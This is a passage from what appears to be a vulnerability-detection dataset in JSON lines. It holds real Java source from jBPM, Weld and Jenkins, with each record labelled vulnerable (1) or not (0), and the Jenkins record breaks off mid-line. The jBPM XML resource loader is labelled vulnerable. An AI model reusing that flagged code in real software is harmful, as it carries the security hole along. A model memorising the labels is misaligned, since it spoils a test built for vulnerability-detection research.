{"idx": 1018, "func": "package org.jbpm.designer.bpmn2.resource;\n\n\nimport bpsim.impl.BpsimPackageImpl;\nimport org.eclipse.bpmn2.*;\nimport org.eclipse.bpmn2.util.Bpmn2ResourceImpl;\nimport org.eclipse.emf.common.util.URI;\nimport org.eclipse.emf.common.util.WrappedException;\nimport org.eclipse.emf.ecore.EObject;\nimport org.eclipse.emf.ecore.EStructuralFeature;\nimport org.eclipse.emf.ecore.xmi.XMLLoad;\nimport org.eclipse.emf.ecore.xmi.XMLResource;\nimport org.eclipse.emf.ecore.xmi.XMLSave;\nimport org.eclipse.emf.ecore.xmi.impl.XMLLoadImpl;\nimport org.eclipse.emf.ecore.resource.Resource;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.*;\n\npublic class JBPMBpmn2ResourceImpl extends Bpmn2ResourceImpl {\n\n    public HashMap xmlNameToFeatureMap = new HashMap();\n\n\tpublic JBPMBpmn2ResourceImpl(URI uri) {\n\t\tsuper(uri);\n        this.getDefaultLoadOptions().put(XMLResource.OPTION_DEFER_IDREF_RESOLUTION, true);\n        this.getDefaultLoadOptions().put(XMLResource.OPTION_DISABLE_NOTIFY, true);\n        this.getDefaultLoadOptions().put(XMLResource.OPTION_USE_XML_NAME_TO_FEATURE_MAP, xmlNameToFeatureMap);\n\n        this.getDefaultSaveOptions().put(XMLResource.OPTION_ENCODING, \"UTF-8\");\n        this.getDefaultSaveOptions().put(XMLResource.OPTION_PROCESS_DANGLING_HREF, XMLResource.OPTION_PROCESS_DANGLING_HREF_DISCARD);\n\t}\n\t\n\t@Override\n    protected XMLSave createXMLSave() {\n        prepareSave();\n        return new JBPMXMLSaveImpl(createXMLHelper()) {\n            @Override\n            protected boolean shouldSaveFeature(EObject o, EStructuralFeature f) {\n                if (Bpmn2Package.eINSTANCE.getDocumentation_Text().equals(f))\n                    return false;\n                if (Bpmn2Package.eINSTANCE.getFormalExpression_Body().equals(f))\n                    return false;\n                return super.shouldSaveFeature(o, f);\n            }\n        };\n    }\n\n    @Override\n    protected XMLLoad createXMLLoad() {\n//        DroolsPackageImpl.init();\n//        BpsimPackageImpl.init();\n        return new XMLLoadImpl(createXMLHelper()) {\n\n            @Override\n            public void load(XMLResource resource, InputStream inputStream, Map<?, ?> options) throws IOException {\n                try {\n                    super.load(resource, inputStream, options);\n                }\n                catch (Exception e) {\n                    DiagnosticWrappedException error = new DiagnosticWrappedException(e);\n                    resource.getErrors().add(error);\n                }\n            }\n        };\n    }\n\n    class DiagnosticWrappedException extends WrappedException implements Resource.Diagnostic {\n        private static final long serialVersionUID = 1L;\n        private String location;\n        private int column;\n        private int line;\n\n        public DiagnosticWrappedException(Exception exception) {\n            super(exception);\n        }\n\n        public void setLocation(String location) {\n            this.location = location;\n        }\n\n        public String getLocation() {\n            return location;\n        }\n\n        public void setColumn(int column) {\n            this.column = column;;\n        }\n\n        public int getColumn() {\n            return column;\n        }\n\n        public void setLine(int line) {\n            this.line = line;\n        }\n\n        public int getLine() {\n            return line;\n        }\n    }\n}", "target": 1}
{"idx": 1019, "func": "/*\n * JBoss, Home of Professional Open Source\n * Copyright 2013, Red Hat, Inc., and individual contributors\n * by the @authors tag. See the copyright.txt in the distribution for a\n * full listing of individual contributors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n * http://www.apache.org/licenses/LICENSE-2.0\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage org.jboss.weld.servlet;\n\nimport javax.servlet.ServletContext;\nimport javax.servlet.ServletRequestListener;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpSession;\n\nimport org.jboss.weld.Container;\nimport org.jboss.weld.bootstrap.api.Service;\nimport org.jboss.weld.context.BoundContext;\nimport org.jboss.weld.context.ManagedContext;\nimport org.jboss.weld.context.cache.RequestScopedCache;\nimport org.jboss.weld.context.http.HttpRequestContext;\nimport org.jboss.weld.context.http.HttpRequestContextImpl;\nimport org.jboss.weld.context.http.HttpSessionContext;\nimport org.jboss.weld.context.http.HttpSessionDestructionContext;\nimport org.jboss.weld.event.FastEvent;\nimport org.jboss.weld.literal.DestroyedLiteral;\nimport org.jboss.weld.literal.InitializedLiteral;\nimport org.jboss.weld.logging.ServletLogger;\nimport org.jboss.weld.manager.BeanManagerImpl;\nimport org.jboss.weld.servlet.spi.HttpContextActivationFilter;\nimport org.jboss.weld.util.reflection.Reflections;\n\n/**\n * Takes care of setting up and tearing down CDI contexts around an HTTP request and dispatching context lifecycle events.\n *\n * @author Jozef Hartinger\n * @author Marko Luksa\n *\n */\npublic class HttpContextLifecycle implements Service {\n\n    private static final String HTTP_SESSION = \"org.jboss.weld.\" + HttpSession.class.getName();\n\n    private static final String INCLUDE_HEADER = \"javax.servlet.include.request_uri\";\n    private static final String FORWARD_HEADER = \"javax.servlet.forward.request_uri\";\n    private static final String REQUEST_DESTROYED = HttpContextLifecycle.class.getName() + \".request.destroyed\";\n\n    private static final String GUARD_PARAMETER_NAME = \"org.jboss.weld.context.ignore.guard.marker\";\n    private static final Object GUARD_PARAMETER_VALUE = new Object();\n\n    private HttpSessionDestructionContext sessionDestructionContextCache;\n    private HttpSessionContext sessionContextCache;\n    private HttpRequestContext requestContextCache;\n\n    private volatile Boolean conversationActivationEnabled;\n    private final boolean ignoreForwards;\n    private final boolean ignoreIncludes;\n\n    private final BeanManagerImpl beanManager;\n    private final ConversationContextActivator conversationContextActivator;\n    private final HttpContextActivationFilter contextActivationFilter;\n\n    private final FastEvent<ServletContext> applicationInitializedEvent;\n    private final FastEvent<ServletContext> applicationDestroyedEvent;\n    private final FastEvent<HttpServletRequest> requestInitializedEvent;\n    private final FastEvent<HttpServletRequest> requestDestroyedEvent;\n    private final FastEvent<HttpSession> sessionInitializedEvent;\n    private final FastEvent<HttpSession> sessionDestroyedEvent;\n\n    private final ServletApiAbstraction servletApi;\n\n    private final ServletContextService servletContextService;\n\n    private final Container container;\n\n    private static final ThreadLocal<Counter> nestedInvocationGuard = new ThreadLocal<HttpContextLifecycle.Counter>();\n    private final boolean nestedInvocationGuardEnabled;\n\n    private static class Counter {\n        private int value = 1;\n    }\n\n    public HttpContextLifecycle(BeanManagerImpl beanManager, HttpContextActivationFilter contextActivationFilter, boolean ignoreForwards, boolean ignoreIncludes, boolean lazyConversationContext, boolean nestedInvocationGuardEnabled) {\n        this.beanManager = beanManager;\n        this.conversationContextActivator = new ConversationContextActivator(beanManager, lazyConversationContext);\n        this.conversationActivationEnabled = null;\n        this.ignoreForwards = ignoreForwards;\n        this.ignoreIncludes = ignoreIncludes;\n        this.contextActivationFilter = contextActivationFilter;\n        this.applicationInitializedEvent = FastEvent.of(ServletContext.class, beanManager, InitializedLiteral.APPLICATION);\n        this.applicationDestroyedEvent = FastEvent.of(ServletContext.class, beanManager, DestroyedLiteral.APPLICATION);\n        this.requestInitializedEvent = FastEvent.of(HttpServletRequest.class, beanManager, InitializedLiteral.REQUEST);\n        this.requestDestroyedEvent = FastEvent.of(HttpServletRequest.class, beanManager, DestroyedLiteral.REQUEST);\n        this.sessionInitializedEvent = FastEvent.of(HttpSession.class, beanManager, InitializedLiteral.SESSION);\n        this.sessionDestroyedEvent = FastEvent.of(HttpSession.class, beanManager, DestroyedLiteral.SESSION);\n        this.servletApi = beanManager.getServices().get(ServletApiAbstraction.class);\n        this.servletContextService = beanManager.getServices().get(ServletContextService.class);\n        this.nestedInvocationGuardEnabled = nestedInvocationGuardEnabled;\n        this.container = Container.instance(beanManager);\n    }\n\n    private HttpSessionDestructionContext getSessionDestructionContext() {\n        if (sessionDestructionContextCache == null) {\n            this.sessionDestructionContextCache = beanManager.instance().select(HttpSessionDestructionContext.class).get();\n        }\n        return sessionDestructionContextCache;\n    }\n\n    private HttpSessionContext getSessionContext() {\n        if (sessionContextCache == null) {\n            this.sessionContextCache = beanManager.instance().select(HttpSessionContext.class).get();\n        }\n        return sessionContextCache;\n    }\n\n    public HttpRequestContext getRequestContext() {\n        if (requestContextCache == null) {\n            this.requestContextCache = beanManager.instance().select(HttpRequestContext.class).get();\n        }\n        return requestContextCache;\n    }\n\n    public void contextInitialized(ServletContext ctx) {\n        servletContextService.contextInitialized(ctx);\n        synchronized (container) {\n            applicationInitializedEvent.fire(ctx);\n        }\n    }\n\n    public void contextDestroyed(ServletContext ctx) {\n        synchronized (container) {\n            applicationDestroyedEvent.fire(ctx);\n        }\n    }\n\n    public void sessionCreated(HttpSession session) {\n        SessionHolder.sessionCreated(session);\n        conversationContextActivator.sessionCreated(session);\n        sessionInitializedEvent.fire(session);\n    }\n\n    public void sessionDestroyed(HttpSession session) {\n        // Mark the session context and conversation contexts to destroy\n        // instances when appropriate\n        deactivateSessionDestructionContext(session);\n        boolean destroyed = getSessionContext().destroy(session);\n        SessionHolder.clear();\n        RequestScopedCache.endRequest();\n        if (destroyed) {\n            // we are outside of a request (the session timed out) and therefore the session was destroyed immediately\n            // we can fire the @Destroyed(SessionScoped.class) event immediately\n            sessionDestroyedEvent.fire(session);\n        } else {\n            // the old session won't be available at the time we destroy this request\n            // let's store its reference until then\n            if (getRequestContext() instanceof HttpRequestContextImpl) {\n                HttpServletRequest request = Reflections.<HttpRequestContextImpl> cast(getRequestContext()).getHttpServletRequest();\n                request.setAttribute(HTTP_SESSION, session);\n            }\n        }\n    }\n\n    private void deactivateSessionDestructionContext(HttpSession session) {\n        HttpSessionDestructionContext context = getSessionDestructionContext();\n        if (context.isActive()) {\n            context.deactivate();\n            context.dissociate(session);\n        }\n    }\n\n    public void requestInitialized(HttpServletRequest request, ServletContext ctx) {\n        if (nestedInvocationGuardEnabled) {\n            Counter counter = nestedInvocationGuard.get();\n            Object marker = request.getAttribute(GUARD_PARAMETER_NAME);\n            if (counter != null && marker != null) {\n                // this is a nested invocation, increment the counter and ignore this invocation\n                counter.value++;\n                return;\n            } else {\n                if (counter != null && marker == null) {\n                    /*\n                     * This request has not been processed yet but the guard is set already.\n                     * That indicates, that the guard leaked from a previous request processing - most likely\n                     * the Servlet container did not invoke listener methods symmetrically.\n                     * Log a warning and recover by re-initializing the guard\n                     */\n                    ServletLogger.LOG.guardLeak(counter.value);\n                }\n                // this is the initial (outer) invocation\n                nestedInvocationGuard.set(new Counter());\n                request.setAttribute(GUARD_PARAMETER_NAME, GUARD_PARAMETER_VALUE);\n            }\n        }\n        if (ignoreForwards && isForwardedRequest(request)) {\n            return;\n        }\n        if (ignoreIncludes && isIncludedRequest(request)) {\n            return;\n        }\n        if (!contextActivationFilter.accepts(request)) {\n            return;\n        }\n\n        ServletLogger.LOG.requestInitialized(request);\n\n        SessionHolder.requestInitialized(request);\n\n        getRequestContext().associate(request);\n        getSessionContext().associate(request);\n        if (conversationActivationEnabled) {\n            conversationContextActivator.associateConversationContext(request);\n        }\n\n        getRequestContext().activate();\n        getSessionContext().activate();\n\n        try {\n            if (conversationActivationEnabled) {\n                conversationContextActivator.activateConversationContext(request);\n            }\n            requestInitializedEvent.fire(request);\n        } catch (RuntimeException e) {\n            try {\n                requestDestroyed(request);\n            } catch (Exception ignored) {\n                // ignored in order to let the original exception be thrown\n            }\n            /*\n             * If the servlet container happens to call the destroyed callback again, ignore it.\n             */\n            request.setAttribute(REQUEST_DESTROYED, Boolean.TRUE);\n            throw e;\n        }\n    }\n\n    public void requestDestroyed(HttpServletRequest request) {\n        if (isRequestDestroyed(request)) {\n            return;\n        }\n        if (nestedInvocationGuardEnabled) {\n            Counter counter = nestedInvocationGuard.get();\n            if (counter != null) {\n                counter.value--;\n                if (counter.value > 0) {\n                    return; // this is a nested invocation, ignore it\n                } else {\n                    nestedInvocationGuard.remove(); // this is the outer invocation\n                    request.removeAttribute(GUARD_PARAMETER_NAME);\n                }\n            } else {\n                ServletLogger.LOG.guardNotSet();\n                return;\n            }\n        }\n        if (ignoreForwards && isForwardedRequest(request)) {\n            return;\n        }\n        if (ignoreIncludes && isIncludedRequest(request)) {\n            return;\n        }\n        if (!contextActivationFilter.accepts(request)) {\n            return;\n        }\n\n        ServletLogger.LOG.requestDestroyed(request);\n\n        try {\n            conversationContextActivator.deactivateConversationContext(request);\n            /*\n             * if this request has been switched to async then do not invalidate the context now\n             * as it will be invalidated at the end of the async operation.\n             */\n            if (!servletApi.isAsyncSupported() || !servletApi.isAsyncStarted(request)) {\n                getRequestContext().invalidate();\n            }\n\n            safelyDeactivate(getRequestContext(),  request);\n            // fire @Destroyed(RequestScoped.class)\n            requestDestroyedEvent.fire(request);\n\n            safelyDeactivate(getSessionContext(), request);\n            // fire @Destroyed(SessionScoped.class)\n            if (!getSessionContext().isValid()) {\n                sessionDestroyedEvent.fire((HttpSession) request.getAttribute(HTTP_SESSION));\n            }\n        } finally {\n            safelyDissociate(getRequestContext(), request);\n            // WFLY-1533 Underlying HTTP session may be invalid\n            safelyDissociate(getSessionContext(), request);\n\n            // Catch block is inside the activator method so that we're able to log the context\n            conversationContextActivator.disassociateConversationContext(request);\n\n            SessionHolder.clear();\n        }\n    }\n\n    public boolean isConversationActivationSet() {\n        return conversationActivationEnabled != null;\n    }\n\n    public void setConversationActivationEnabled(boolean conversationActivationEnabled) {\n        this.conversationActivationEnabled = conversationActivationEnabled;\n    }\n\n    @Override\n    public void cleanup() {\n    }\n\n    /**\n     * Some Servlet containers fire HttpServletListeners for include requests (inner requests caused by calling the include method of RequestDispatcher). This\n     * causes problems with context shut down as context manipulation is not reentrant. This method detects if this request is an included request or not.\n     */\n    private boolean isIncludedRequest(HttpServletRequest request) {\n        return request.getAttribute(INCLUDE_HEADER) != null;\n    }\n\n    /**\n     * Some Servlet containers fire HttpServletListeners for forward requests (inner requests caused by calling the forward method of RequestDispatcher). This\n     * causes problems with context shut down as context manipulation is not reentrant. This method detects if this request is an forwarded request or not.\n     */\n    private boolean isForwardedRequest(HttpServletRequest request) {\n        return request.getAttribute(FORWARD_HEADER) != null;\n    }\n\n    /**\n     * The way servlet containers react to an exception that occurs in a {@link ServletRequestListener} differs among servlet listeners. In certain containers\n     * the destroyed callback may be invoked multiple times, causing the latter invocations to fail as thread locals have already been unset. We use the\n     * {@link #REQUEST_DESTROYED} flag to indicate that all further invocations of the\n     * {@link ServletRequestListener#requestDestroyed(javax.servlet.ServletRequestEvent)} should be ignored by Weld.\n     */\n    private boolean isRequestDestroyed(HttpServletRequest request) {\n        return request.getAttribute(REQUEST_DESTROYED) != null;\n    }\n\n    private <T> void safelyDissociate(BoundContext<T> context, T storage) {\n        try {\n            context.dissociate(storage);\n        } catch(Exception e) {\n            ServletLogger.LOG.unableToDissociateContext(context, storage);\n            ServletLogger.LOG.catchingDebug(e);\n        }\n    }\n\n    private void safelyDeactivate(ManagedContext context, HttpServletRequest request) {\n        try {\n            context.deactivate();\n        } catch(Exception e) {\n            ServletLogger.LOG.unableToDeactivateContext(context, request);\n            ServletLogger.LOG.catchingDebug(e);\n        }\n    }\n\n}\n", "target": 0}
{"idx": 1020, "func": "/*\n * The MIT License\n * \n * Copyright (c) 2004-2010, Sun Microsystems, Inc., Kohsuke Kawaguchi,\n * Yahoo! Inc., Stephen Connolly, Tom Huybrechts, Alan Harder, Manufacture\n * Francaise des Pneumatiques Michelin, Romain Seguy\n * \n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n * \n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n * \n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage hudson;\n\nimport com.google.common.base.Predicate;\nimport com.google.common.base.Predicates;\nimport hudson.cli.CLICommand;\nimport hudson.console.ConsoleAnnotationDescriptor;\nimport hudson.console.ConsoleAnnotatorFactory;\nimport hudson.model.*;\nimport hudson.model.ParameterDefinition.ParameterDescriptor;\nimport hudson.search.SearchableModelObject;\nimport hudson.security.AccessControlled;\nimport hudson.security.AuthorizationStrategy;\nimport hudson.security.GlobalSecurityConfiguration;\nimport hudson.security.Permission;\nimport hudson.security.SecurityRealm;\nimport hudson.security.captcha.CaptchaSupport;\nimport hudson.security.csrf.CrumbIssuer;\nimport hudson.slaves.Cloud;\nimport hudson.slaves.ComputerLauncher;\nimport hudson.slaves.NodeProperty;\nimport hudson.slaves.NodePropertyDescriptor;\nimport hudson.slaves.RetentionStrategy;\nimport hudson.tasks.BuildStepDescriptor;\nimport hudson.tasks.BuildWrapper;\nimport hudson.tasks.BuildWrappers;\nimport hudson.tasks.Builder;\nimport hudson.tasks.Publisher;\nimport hudson.tasks.UserAvatarResolver;\nimport hudson.util.Area;\nimport hudson.util.Iterators;\nimport hudson.scm.SCM;\nimport hudson.scm.SCMDescriptor;\nimport hudson.util.Secret;\nimport hudson.views.MyViewsTabBar;\nimport hudson.views.ViewsTabBar;\nimport hudson.widgets.RenderOnDemandClosure;\nimport jenkins.model.GlobalConfiguration;\nimport jenkins.model.GlobalConfigurationCategory;\nimport jenkins.model.GlobalConfigurationCategory.Unclassified;\nimport jenkins.model.Jenkins;\nimport jenkins.model.ModelObjectWithContextMenu;\nimport org.acegisecurity.providers.anonymous.AnonymousAuthenticationToken;\nimport org.apache.commons.jelly.JellyContext;\nimport org.apache.commons.jelly.JellyTagException;\nimport org.apache.commons.jelly.Script;\nimport org.apache.commons.jelly.XMLOutput;\nimport org.apache.commons.jexl.parser.ASTSizeFunction;\nimport org.apache.commons.jexl.util.Introspector;\nimport org.codehaus.mojo.animal_sniffer.IgnoreJRERequirement;\nimport org.jvnet.tiger_types.Types;\nimport org.kohsuke.stapler.Ancestor;\nimport org.kohsuke.stapler.Stapler;\nimport org.kohsuke.stapler.StaplerRequest;\nimport org.kohsuke.stapler.StaplerResponse;\nimport org.kohsuke.stapler.jelly.InternationalizedStringExpression.RawHtmlArgument;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport java.io.StringWriter;\nimport java.io.UnsupportedEncodingException;\nimport java.lang.management.LockInfo;\nimport java.lang.management.ManagementFactory;\nimport java.lang.management.MonitorInfo;\nimport java.lang.management.ThreadInfo;\nimport java.lang.management.ThreadMXBean;\nimport java.lang.reflect.Type;\nimport java.lang.reflect.ParameterizedType;\nimport java.net.MalformedURLException;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.net.URL;\nimport java.net.URLDecoder;\nimport java.text.DecimalFormat;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Calendar;\nimport java.util.Collection;\nimport java.util.Collections;\nimport java.util.Comparator;\nimport java.util.ConcurrentModificationException;\nimport java.util.Enumeration;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.SortedMap;\nimport java.util.TreeMap;\nimport java.util.Date;\nimport java.util.logging.Level;\nimport java.util.logging.LogManager;\nimport java.util.logging.LogRecord;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\nimport java.util.regex.Pattern;\nimport org.apache.commons.lang.StringUtils;\nimport org.kohsuke.accmod.Restricted;\nimport org.kohsuke.accmod.restrictions.NoExternalUse;\n\n/**\n * Utility functions used in views.\n *\n * <p>\n * An instance of this class is created for each request and made accessible\n * from view pages via the variable 'h' (h stands for Hudson.)\n *\n * @author Kohsuke Kawaguchi\n */\npublic class Functions {\n    private static volatile int globalIota = 0;\n    private int iota;\n\n    public Functions() {\n        iota = globalIota;\n        // concurrent requests can use the same ID --- we are just trying to\n        // prevent the same user from seeing the same ID repeatedly.\n        globalIota+=1000;\n    }\n\n    /**\n     * Generates an unique ID.\n     */\n    public String generateId() {\n        return \"id\"+iota++;\n    }\n\n    public static boolean isModel(Object o) {\n        return o instanceof ModelObject;\n    }\n\n    public static boolean isModelWithContextMenu(Object o) {\n        return o instanceof ModelObjectWithContextMenu;\n    }\n\n    public static String xsDate(Calendar cal) {\n        return Util.XS_DATETIME_FORMATTER.format(cal.getTime());\n    }\n\n    public static String rfc822Date(Calendar cal) {\n        return Util.RFC822_DATETIME_FORMATTER.format(cal.getTime());\n    }\n    \n    public static void initPageVariables(JellyContext context) {\n        String rootURL = Stapler.getCurrentRequest().getContextPath();\n\n        Functions h = new Functions();\n        context.setVariable(\"h\", h);\n\n\n        // The path starts with a \"/\" character but does not end with a \"/\" character.\n        context.setVariable(\"rootURL\", rootURL);\n\n        /*\n            load static resources from the path dedicated to a specific version.\n            This \"/static/VERSION/abc/def.ghi\" path is interpreted by stapler to be\n            the same thing as \"/abc/def.ghi\", but this avoids the stale cache\n            problem when the user upgrades to new Jenkins. Stapler also sets a long\n            future expiration dates for such static resources.\n\n            see https://wiki.jenkins-ci.org/display/JENKINS/Hyperlinks+in+HTML\n         */\n        context.setVariable(\"resURL\",rootURL+getResourcePath());\n        context.setVariable(\"imagesURL\",rootURL+getResourcePath()+\"/images\");\n    }\n\n    /**\n     * Given {@code c=MyList (extends ArrayList<Foo>), base=List}, compute the parameterization of 'base'\n     * that's assignable from 'c' (in this case {@code List<Foo>}), and return its n-th type parameter\n     * (n=0 would return {@code Foo}).\n     *\n     * <p>\n     * This method is useful for doing type arithmetic.\n     *\n     * @throws AssertionError\n     *      if c' is not parameterized.\n     */\n    public static <B> Class getTypeParameter(Class<? extends B> c, Class<B> base, int n) {\n        Type parameterization = Types.getBaseClass(c,base);\n        if (parameterization instanceof ParameterizedType) {\n            ParameterizedType pt = (ParameterizedType) parameterization;\n            return Types.erasure(Types.getTypeArgument(pt,n));\n        } else {\n            throw new AssertionError(c+\" doesn't properly parameterize \"+base);\n        }\n    }\n\n    public JDK.DescriptorImpl getJDKDescriptor() {\n        return Jenkins.getInstance().getDescriptorByType(JDK.DescriptorImpl.class);\n    }\n\n    /**\n     * Prints the integer as a string that represents difference,\n     * like \"-5\", \"+/-0\", \"+3\".\n     */\n    public static String getDiffString(int i) {\n        if(i==0)    return \"\\u00B10\";   // +/-0\n        String s = Integer.toString(i);\n        if(i>0)     return \"+\"+s;\n        else        return s;\n    }\n\n    /**\n     * {@link #getDiffString(int)} that doesn't show anything for +/-0\n     */\n    public static String getDiffString2(int i) {\n        if(i==0)    return \"\";\n        String s = Integer.toString(i);\n        if(i>0)     return \"+\"+s;\n        else        return s;\n    }\n\n    /**\n     * {@link #getDiffString2(int)} that puts the result into prefix and suffix\n     * if there's something to print\n     */\n    public static String getDiffString2(String prefix, int i, String suffix) {\n        if(i==0)    return \"\";\n        String s = Integer.toString(i);\n        if(i>0)     return prefix+\"+\"+s+suffix;\n        else        return prefix+s+suffix;\n    }\n\n    /**\n     * Adds the proper suffix.\n     */\n    public static String addSuffix(int n, String singular, String plural) {\n        StringBuilder buf = new StringBuilder();\n        buf.append(n).append(' ');\n        if(n==1)\n            buf.append(singular);\n        else\n            buf.append(plural);\n        return buf.toString();\n    }\n\n    public static RunUrl decompose(StaplerRequest req) {\n        List<Ancestor> ancestors = req.getAncestors();\n\n        // find the first and last Run instances\n        Ancestor f=null,l=null;\n        for (Ancestor anc : ancestors) {\n            if(anc.getObject() instanceof Run) {\n                if(f==null) f=anc;\n                l=anc;\n            }\n        }\n        if(l==null) return null;    // there was no Run object\n\n        String head = f.getPrev().getUrl()+'/';\n        String base = l.getUrl();\n\n        String reqUri = req.getOriginalRequestURI();\n        // Find \"rest\" or URI by removing N path components.\n        // Not using reqUri.substring(f.getUrl().length()) to avoid mismatches due to\n        // url-encoding or extra slashes.  Former may occur in Tomcat (despite the spec saying\n        // this string is not decoded, Tomcat apparently decodes this string. You see ' '\n        // instead of '%20', which is what the browser has sent), latter may occur in some\n        // proxy or URL-rewriting setups where extra slashes are inadvertently added.\n        String furl = f.getUrl();\n        int slashCount = 0;\n        // Count components in ancestor URL\n        for (int i = furl.indexOf('/'); i >= 0; i = furl.indexOf('/', i + 1)) slashCount++;\n        // Remove that many from request URL, ignoring extra slashes\n        String rest = reqUri.replaceFirst(\"(?:/+[^/]*){\" + slashCount + \"}\", \"\");\n\n        return new RunUrl( (Run) f.getObject(), head, base, rest);\n    }\n\n    /**\n     * If we know the user's screen resolution, return it. Otherwise null.\n     * @since 1.213\n     */\n    public static Area getScreenResolution() {\n        Cookie res = Functions.getCookie(Stapler.getCurrentRequest(),\"screenResolution\");\n        if(res!=null)\n            return Area.parse(res.getValue());\n        return null;\n    }\n\n    /**\n     * URL decomposed for easier computation of relevant URLs.\n     *\n     * <p>\n     * The decomposed URL will be of the form:\n     * <pre>\n     * aaaaaa/524/bbbbb/cccc\n     * -head-| N |---rest---\n     * ----- base -----|\n     * </pre>\n     *\n     * <p>\n     * The head portion is the part of the URL from the {@link jenkins.model.Jenkins}\n     * object to the first {@link Run} subtype. When \"next/prev build\"\n     * is chosen, this part remains intact.\n     *\n     * <p>\n     * The <tt>524</tt> is the path from {@link Job} to {@link Run}.\n     *\n     * <p>\n     * The <tt>bbb</tt> portion is the path after that till the last\n     * {@link Run} subtype. The <tt>ccc</tt> portion is the part\n     * after that.\n     */\n    public static final class RunUrl {\n        private final String head, base, rest;\n        private final Run run;\n\n\n        public RunUrl(Run run, String head, String base, String rest) {\n            this.run = run;\n            this.head = head;\n            this.base = base;\n            this.rest = rest;\n        }\n\n        public String getBaseUrl() {\n            return base;\n        }\n\n        /**\n         * Returns the same page in the next build.\n         */\n        public String getNextBuildUrl() {\n            return getUrl(run.getNextBuild());\n        }\n\n        /**\n         * Returns the same page in the previous build.\n         */\n        public String getPreviousBuildUrl() {\n            return getUrl(run.getPreviousBuild());\n        }\n\n        private String getUrl(Run n) {\n            if(n ==null)\n                return null;\n            else {\n                return head+n.getNumber()+rest;\n            }\n        }\n    }\n\n    public static Node.Mode[] getNodeModes() {\n        return Node.Mode.values();\n    }\n\n    public static String getProjectListString(List<Project> projects) {\n        return Items.toNameList(projects);\n    }\n\n    /**\n     * @deprecated as of 1.294\n     *      JEXL now supports the real ternary operator \"x?y:z\", so this work around\n     *      is no longer necessary.\n     */\n    public static Object ifThenElse(boolean cond, Object thenValue, Object elseValue) {\n        return cond ? thenValue : elseValue;\n    }\n\n    public static String appendIfNotNull(String text, String suffix, String nullText) {\n        return text == null ? nullText : text + suffix;\n    }\n\n    public static Map getSystemProperties() {\n        return new TreeMap<Object,Object>(System.getProperties());\n    }\n\n    public static Map getEnvVars() {\n        return new TreeMap<String,String>(EnvVars.masterEnvVars);\n    }\n\n    public static boolean isWindows() {\n        return File.pathSeparatorChar==';';\n    }\n\n    public static List<LogRecord> getLogRecords() {\n        return Jenkins.logRecords;\n    }\n\n    public static String printLogRecord(LogRecord r) {\n        return formatter.format(r);\n    }\n\n    public static Cookie getCookie(HttpServletRequest req,String name) {\n        Cookie[] cookies = req.getCookies();\n        if(cookies!=null) {\n            for (Cookie cookie : cookies) {\n                if(cookie.getName().equals(name)) {\n                    return cookie;\n                }\n            }\n        }\n        return null;\n    }\n\n    public static String getCookie(HttpServletRequest req,String name, String defaultValue) {\n        Cookie c = getCookie(req, name);\n        if(c==null || c.getValue()==null) return defaultValue;\n        return c.getValue();\n    }\n\n    private static final Pattern ICON_SIZE = Pattern.compile(\"\\\\d+x\\\\d+\");\n    @Restricted(NoExternalUse.class)\n    public static String validateIconSize(String iconSize) throws SecurityException {\n        if (!ICON_SIZE.matcher(iconSize).matches()) {\n            throw new SecurityException(\"invalid iconSize\");\n        }\n        return iconSize;\n    }\n\n    /**\n     * Gets the suffix to use for YUI JavaScript.\n     */\n    public static String getYuiSuffix() {\n        return DEBUG_YUI ? \"debug\" : \"min\";\n    }\n\n    /**\n     * Set to true if you need to use the debug version of YUI.\n     */\n    public static boolean DEBUG_YUI = Boolean.getBoolean(\"debug.YUI\");\n\n    /**\n     * Creates a sub map by using the given range (both ends inclusive).\n     */\n    public static <V> SortedMap<Integer,V> filter(SortedMap<Integer,V> map, String from, String to) {\n        if(from==null && to==null)      return map;\n        if(to==null)\n            return map.headMap(Integer.parseInt(from)-1);\n        if(from==null)\n            return map.tailMap(Integer.parseInt(to));\n\n        return map.subMap(Integer.parseInt(to),Integer.parseInt(from)-1);\n    }\n\n    private static final SimpleFormatter formatter = new SimpleFormatter();\n\n    /**\n     * Used by <tt>layout.jelly</tt> to control the auto refresh behavior.\n     *\n     * @param noAutoRefresh\n     *      On certain pages, like a page with forms, will have annoying interference\n     *      with auto refresh. On those pages, disable auto-refresh.\n     */\n    public static void configureAutoRefresh(HttpServletRequest request, HttpServletResponse response, boolean noAutoRefresh) {\n        if(noAutoRefresh)\n            return;\n\n        String param = request.getParameter(\"auto_refresh\");\n        boolean refresh = isAutoRefresh(request);\n        if (param != null) {\n            refresh = Boolean.parseBoolean(param);\n            Cookie c = new Cookie(\"hudson_auto_refresh\", 